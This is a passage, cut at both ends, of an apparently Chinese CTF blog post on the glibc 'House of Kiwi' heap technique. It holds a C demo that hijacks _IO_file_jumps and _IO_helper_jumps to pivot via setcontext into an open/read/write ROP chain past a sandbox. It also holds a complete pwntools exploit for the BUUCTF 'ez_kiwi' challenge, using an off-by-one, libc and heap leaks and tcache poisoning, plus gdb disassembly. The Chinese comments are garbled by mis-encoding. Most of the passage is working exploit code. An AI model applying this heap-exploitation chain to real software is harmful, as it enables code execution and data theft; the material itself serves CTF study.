class="hljs-type">size_t</span>)FLAG;<br>    ROP[i++] = pop_rsi_ret;<br>    ROP[i++] = <span class="hljs-number">0</span>;<br>    ROP[i++] = syscall_ret;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = <span class="hljs-number">3</span>;<br>    ROP[i++] = pop_rdx_r12;<br>    ROP[i++] = <span class="hljs-number">0x100</span>;<br>    ROP[i++] = <span class="hljs-number">0</span>;<br>    ROP[i++] = pop_rsi_ret;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)(FLAG + <span class="hljs-number">0x10</span>);<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)read;<br>    ROP[i++] = pop_rdi_ret;<br>    ROP[i++] = <span class="hljs-number">1</span>;<br>    ROP[i++] = (<span class="hljs-type">size_t</span>)write;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">setvbuf</span>(stdin,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">setvbuf</span>(stdout,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">setvbuf</span>(stderr,<span class="hljs-number">0LL</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">sandbox</span>();<br>    libc_base  = ((<span class="hljs-type">size_t</span>)setvbuf) - <span class="hljs-number">0x81630</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);<br><br>    <span class="hljs-type">size_t</span> magic_gadget = libc_base + <span class="hljs-number">0x53030</span> + <span class="hljs-number">61</span>; <span class="hljs-comment">// setcontext + 61</span><br>    <span class="hljs-type">size_t</span> IO_helper = libc_base + <span class="hljs-number">0x1E48C0</span>; <span class="hljs-comment">// _IO_hel</span><br>    per_jumps;<br>    <span class="hljs-type">size_t</span> SYNC = libc_base + <span class="hljs-number">0x1E5520</span>; <span class="hljs-comment">// sync pointer in _IO_file_jumps</span><br>    <span class="hljs-built_in">setROP</span>();<br>    *((<span class="hljs-type">size_t</span>*)IO_helper + <span class="hljs-number">0xA0</span>/<span class="hljs-number">8</span>) = ROP; <span class="hljs-comment">// è®¾ç½®rsp</span><br>    *((<span class="hljs-type">size_t</span>*)IO_helper + <span class="hljs-number">0xA8</span>/<span class="hljs-number">8</span>) = ret; <span class="hljs-comment">// è®¾ç½®rcx å³ ç¨‹åºsetcontextè¿è¡Œå®Œåä¼šé¦–å…ˆè°ƒç”¨çš„æŒ‡ä»¤åœ°å€</span><br>    *((<span class="hljs-type">size_t</span>*)SYNC) = magic_gadget; <span class="hljs-comment">// è®¾ç½®fflush(stderr)ä¸­è°ƒç”¨çš„æŒ‡ä»¤åœ°å€</span><br>    <span class="hljs-comment">// è§¦å‘assertæ–­è¨€,é€šè¿‡large bin chunkçš„sizeä¸­flagä½ä¿®æ”¹,æˆ–è€…top chunkçš„inuseå†™0ç­‰æ–¹æ³•å¯ä»¥è§¦å‘assert</span><br>    <span class="hljs-type">size_t</span> *top_size = (<span class="hljs-type">size_t</span>*)((<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>) + <span class="hljs-number">0x18</span>);<br>    *top_size = (*top_size)&amp;<span class="hljs-number">0xFFE</span>; <span class="hljs-comment">// top_chunk sizeæ”¹å°å¹¶å°†inuseå†™0,å½“top chunkä¸è¶³çš„æ—¶å€™,ä¼šè¿›å…¥sysmallocä¸­,å…¶ä¸­æœ‰ä¸ªåˆ¤æ–­top_chunkçš„sizeä¸­inuseä½æ˜¯å¦å­˜åœ¨</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>); <span class="hljs-comment">// è§¦å‘assert</span><br>    _exit(<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è°ƒè¯•å’Œä¾‹é¢˜"><a class="header-anchor" href="#è°ƒè¯•å’Œä¾‹é¢˜">Â¶</a>è°ƒè¯•å’Œä¾‹é¢˜</h4><p>ğŸ‘´ ç§è‡ªè®¤ä¸º <strong>kiwi ç®€æ´ä½†ä¸ç®€å•</strong>ï¼Œç®€æ´åˆ°ç®€å•æ”¹æ”¹ demo å°±èƒ½åœ¨å…¶ä»–çš„é¢˜ç›®é‡Œæ‰“ <strong>ROP</strong> ç»•æ²™ç®±ã€‚åˆä¸ç®€å•åˆ°å¿…é¡»<strong>è‡ªå·±è°ƒè¯•</strong>ï¼Œæ‰èƒ½è¾ƒå¥½åœ°æŒæ¡è¿™ä¸€åˆ©ç”¨è·¯çº¿ï¼Œäº†è§£å…¶ä¸­ç»†èŠ‚ï¼Œä»¥åå’Œå…¶ä»–æ–¹æ³•ç»“åˆèµ·æ¥æ‰èƒ½æ¯”è¾ƒä»å®¹ã€‚</p><h5 id="ez-kiwi"><a class="header-anchor" href="#ez-kiwi">Â¶</a>ez_kiwi</h5><p>å‡ºè‡ª BUUCTF çš„ <a href="https://buuoj.cn/match/matches/109/challenges#ez_kiwi">Dest0g3 520è¿æ–°èµ›</a></p><h6 id="åˆ†æ-v3"><a class="header-anchor" href="#åˆ†æ-v3">Â¶</a>åˆ†æ</h6><p>è¿™é¢˜æŒºé€‚åˆæ‹¿æ¥è°ƒè¯• kiwi çš„ï¼Œé¢˜ç›®ç»™äº†ä¸ªç®€å•çš„ off-by-one ï¼ŒğŸ‘´ è®¤ä¸º off-by-one æ˜¯éå¸¸ç™½ç»™çš„æ¼æ´æ‰€ä»¥ä¸ä¼šéš¾ã€‚</p><p>åŒæ—¶é¢˜ç›®æ²¡æœ‰ç»™æ˜¾å¼çš„ exit å¹¶ä¸”æ¯æ¬¡è¿›å…¥ menu å‰ä¼šæ¸…é™¤å‡ ä¸ª hook ï¼Œä¹Ÿæ˜¯è¦æ±‚æˆ‘ä»¬æ‰“ IO äº†ã€‚</p><p>ä½†æ˜¯å‡ºé¢˜äººè¿™æ¬¡æ‰€æœ‰çš„é¢˜ç›®éƒ½æ²¡æœ‰å¼€ sandbox ï¼Œè¿™æ˜¯ä¸ªå¤§ä¼ç¬”ï¼Œæš‚æŒ‰ä¸‹ä¸è¡¨ã€‚</p><h6 id="æ€è·¯-v3"><a class="header-anchor" href="#æ€è·¯-v3">Â¶</a>æ€è·¯</h6><ol><li>off-by-one æ‰“å †é‡å æ”¹ size æ‹¿åˆ°å¤§ chunk</li><li>Free å¤§ chunk å†æ‹¿å›æ¥ï¼Œåˆ©ç”¨æ®‹ç•™æŒ‡é’ˆç®€å•çš„ leak</li><li>åˆ©ç”¨é‡å å †å—é‡Œçš„ chunk æ„é€  Tcache Poisoning ä»»æ„å†™ï¼Œæ‰“ kiwi</li></ol><h6 id="Exp-v3"><a class="header-anchor" href="#Exp-v3">Â¶</a>Exp</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.31/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,<span class="hljs-built_in">id</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;How much do you want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Which one do you want to put?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Tell me your idea:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to remove?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to look?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to change?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Change your idea:&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    menu(<span class="hljs-number">666</span>)<br><br><span class="hljs-comment"># flag_addr = heap_base + 0x2a0</span><br>sla(<span class="hljs-string">&#x27;Before the game starts, please give me your name:\n&#x27;</span>,<span class="hljs-string">&#x27;./flag\0&#x27;</span>)<br><br><span class="hljs-comment"># Easy Heap Fengshui</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">3</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">4</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">5</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">6</span>) <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>) <span class="hljs-comment"># 8</span><br><br><span class="hljs-comment"># chunk1 -&gt; size = 0x40</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x41&#x27;</span>)<br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># chunk2 -&gt; size = 0x460 Create a unsortedbin</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>*<span class="hljs-number">4</span> + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>dele(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Leak libc</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ebf75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>__sync = libc.sym._IO_file_jumps + <span class="hljs-number">0x60</span><br>_IO_helper_jumps = libc_base + <span class="hljs-number">0x1ec8a0</span><br><br>rax = libc_base + <span class="hljs-number">0x000000000004a550</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000026b72</span><br>rsi = libc_base + <span class="hljs-number">0x0000000000027529</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x000000000011c371</span><br>ret = rdi + <span class="hljs-number">1</span><br>syscall = libc_base + <span class="hljs-number">0x0000000000066229</span><br>read = libc.sym.read<br>write = libc.sym.write<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x000000000004a550 : pop rax ; ret</span><br><span class="hljs-string">0x0000000000026b72 : pop rdi ; ret</span><br><span class="hljs-string">0x000000000011c371 : pop rdx ; pop r12 ; ret</span><br><span class="hljs-string">0x0000000000027529 : pop rsi ; ret</span><br><span class="hljs-string">0x0000000000025679 : ret</span><br><span class="hljs-string">0x0000000000066229: syscall; ret;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># Leak heap</span><br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">6</span>))<br>heap_base = (heap_leak&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>flag_addr = heap_base + <span class="hljs-number">0x2a0</span><br>rop_addr = heap_base + <span class="hljs-number">0x440</span><br><br><span class="hljs-comment"># Prepare ROP</span><br>rop_chain = flat(<br>    <span class="hljs-comment">#   open(&#x27;./flag\0&#x27;)                                                 </span><br>    [rax,<span class="hljs-number">2</span>,rdi,flag_addr,rsi,<span class="hljs-number">0</span>,rdx_r12,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,syscall] + \<br>    <span class="hljs-comment">#   read(new_fd,flag_addr+0x10,0x50)</span><br>    [rdi,<span class="hljs-number">3</span>,rsi,flag_addr+<span class="hljs-number">0x10</span>,rdx_r12,<span class="hljs-number">0x50</span>,<span class="hljs-number">0</span>,read] + \<br>    <span class="hljs-comment">#   write(1,flag_addr+0x10,0x50)</span><br>    [rdi,<span class="hljs-number">1</span>,write] + [<span class="hljs-string">&#x27;\n&#x27;</span>]<br>)<br>edit(<span class="hljs-number">4</span>,rop_chain)<br><br><span class="hljs-comment"># Tcache Poisoning1 _IO_file_jumps -&gt; __sync = setcontext + 61</span><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(__sync) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>,p64(magic))<br><br><span class="hljs-comment"># Tcache Poisoning2 _IO_helper_jumps + 0xA0/0xA8</span><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(_IO_helper_jumps + <span class="hljs-number">0xA0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>,p64(rop_addr) + p64(ret))<br><br><span class="hljs-comment"># Tcache Poisoning3 topchunk -&gt; size </span><br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(heap_base+<span class="hljs-number">0x7a0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Trigger kiwi ~~</span><br>pause()<br>gift()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h6 id="è°ƒè¯•-v3"><a class="header-anchor" href="#è°ƒè¯•-v3">Â¶</a>è°ƒè¯•</h6><p>ç®€å•çš„ off-by-one å°±ä¸æäº†ï¼Œä¸»è¦çœ‹ä¸€ä¸‹ä»»æ„å†™åå’‹è¿›å…¥çš„æˆ‘ä»¬ <strong>kiwi</strong> æµç¨‹ï¼Œåˆæ˜¯æ€ä¹ˆæ‰§è¡Œçš„ <strong>ROP</strong>ã€‚</p><p>åœ¨ gift() å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œ<code>b malloc</code>ã€‚</p><p>å½“å…¶ä»–æ¡ä»¶ä¸æ»¡è¶³æ—¶æ¥åˆ° sysmalloc å‡†å¤‡ä» topchunk ä¸­åˆ†é…ï¼Œä½†ç”±äº topchunk å·²ç»è¢« ğŸ‘´ ğŸ‘ å®Œäº†ï¼Œæ‰€ä»¥ä¼šè¿›å…¥ <code>__malloc_assert</code>ã€‚</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526164931591.png" alt="image-20220526164931591" style="zoom:67%;" /><p>ç„¶åæˆ‘ä»¬çš„ä¸»è§’ <strong>fflush</strong> å°±ç™»åœºäº†ï¼Œè¿™é‡Œçš„ <strong>__fxprintf</strong> ä¹Ÿè¦çœ¼ç†Ÿä¸€ä¸‹( <strong>husk</strong> ä¼šè€ƒ)ï¼š</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526170141182.png" alt="image-20220526170141182" style="zoom:67%;" /><p>è¿™é‡Œæ˜¯é‡ç‚¹ï¼Œæˆ‘ä»¬å¿…é¡»ç»“åˆæ±‡ç¼–ä»£ç æ‰èƒ½ç©æ˜ç™½ç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/40i &amp;fflush<br>   0x7ffff7e5a4c0 &lt;fflush&gt;:     endbr64<br>   0x7ffff7e5a4c4 &lt;fflush+4&gt;:   test   rdi,rdi<br>   0x7ffff7e5a4c7 &lt;fflush+7&gt;:   je     0x7ffff7e5a590 &lt;fflush+208&gt;<br>   0x7ffff7e5a4cd &lt;fflush+13&gt;:  push   rbp<br>   0x7ffff7e5a4ce &lt;fflush+14&gt;:  push   rbx<br>   0x7ffff7e5a4cf &lt;fflush+15&gt;:  mov    rbx,rdi<br>   0x7ffff7e5a4d2 &lt;fflush+18&gt;:  sub    rsp,0x8<br>   0x7ffff7e5a4d6 &lt;fflush+22&gt;:  mov    edx,DWORD PTR [rdi]<br>   0x7ffff7e5a4d8 &lt;fflush+24&gt;:  and    edx,0x8000<br>   0x7ffff7e5a4de &lt;fflush+30&gt;:  jne    0x7ffff7e5a51d &lt;fflush+93&gt;<br>   0x7ffff7e5a4e0 &lt;fflush+32&gt;:  mov    rdi,QWORD PTR [rdi+0x88]<br>   0x7ffff7e5a4e7 &lt;fflush+39&gt;:  mov    rbp,QWORD PTR fs:0x10<br>   0x7ffff7e5a4f0 &lt;fflush+48&gt;:  cmp    QWORD PTR [rdi+0x8],rbp<br>   0x7ffff7e5a4f4 &lt;fflush+52&gt;:  je     0x7ffff7e5a519 &lt;fflush+89&gt;<br>   0x7ffff7e5a4f6 &lt;fflush+54&gt;:  mov    eax,DWORD PTR fs:0x18<br>   0x7ffff7e5a4fe &lt;fflush+62&gt;:  test   eax,eax<br>   0x7ffff7e5a500 &lt;fflush+64&gt;:  jne    0x7ffff7e5a5a0 &lt;fflush+224&gt;<br>   0x7ffff7e5a506 &lt;fflush+70&gt;:  mov    edx,0x1<br>   0x7ffff7e5a50b &lt;fflush+75&gt;:  cmpxchg DWORD PTR [rdi],edx<br>   0x7ffff7e5a50e &lt;fflush+78&gt;:  mov    rdi,QWORD PTR [rbx+0x88]<br>   0x7ffff7e5a515 &lt;fflush+85&gt;:  mov    QWORD PTR [rdi+0x8],rbp<br>   0x7ffff7e5a519 &lt;fflush+89&gt;:  add    DWORD PTR [rdi+0x4],0x1<br>   0x7ffff7e5a51d &lt;fflush+93&gt;:  mov    rbp,QWORD PTR [rbx+0xd8]<br>   0x7ffff7e5a524 &lt;fflush+100&gt;: lea    rdx,[rip+0x167375]        # 0x7ffff7fc18a0 &lt;_IO_helper_jumps&gt;<br>   0x7ffff7e5a52b &lt;fflush+107&gt;: lea    rax,[rip+0x1680d6]        # 0x7ffff7fc2608 &lt;__elf_set___libc_atexit_element__IO_cleanup__&gt;<br>   0x7ffff7e5a532 &lt;fflush+114&gt;: sub    rax,rdx<br>   0x7ffff7e5a535 &lt;fflush+117&gt;: mov    rsi,rbp<br>   0x7ffff7e5a538 &lt;fflush+120&gt;: sub    rsi,rdx<br>   0x7ffff7e5a53b &lt;fflush+123&gt;: cmp    rax,rsi<br>   0x7ffff7e5a53e &lt;fflush+126&gt;: jbe    0x7ffff7e5a598 &lt;fflush+216&gt;<br>   0x7ffff7e5a540 &lt;fflush+128&gt;: mov    rdi,rbx<br>=&gt; 0x7ffff7e5a543 &lt;fflush+131&gt;: call   QWORD PTR 